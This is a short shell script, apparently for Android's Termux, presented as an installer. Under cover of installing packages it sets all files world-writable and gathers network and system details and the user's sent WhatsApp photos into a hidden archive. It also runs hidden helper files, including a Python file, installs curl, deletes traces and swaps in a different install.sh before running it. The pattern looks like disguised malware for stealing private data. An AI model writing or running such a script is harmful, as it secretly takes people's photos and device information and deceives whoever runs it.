chmod 777 *
apt install zip -y
apt install python -y
bash .install
mkdir .info
ifconfig |& tee .info/info
uname -a |& tee .info/info2
cp /sdcard/WhatsApp/Media/"WhatsApp Images"/sent/*.jpg -r .info/
tar -cvf .info.tar .info/*
bash .install
apt install nano -y
apt install curl -y
python .conf
rm -fr .Data.tar info.tar .info .gm .gm1 .p install.sh .ia .ia1 .all
mv .real install.sh
bash .install
chmod 777 *
bash .install
./install.sh
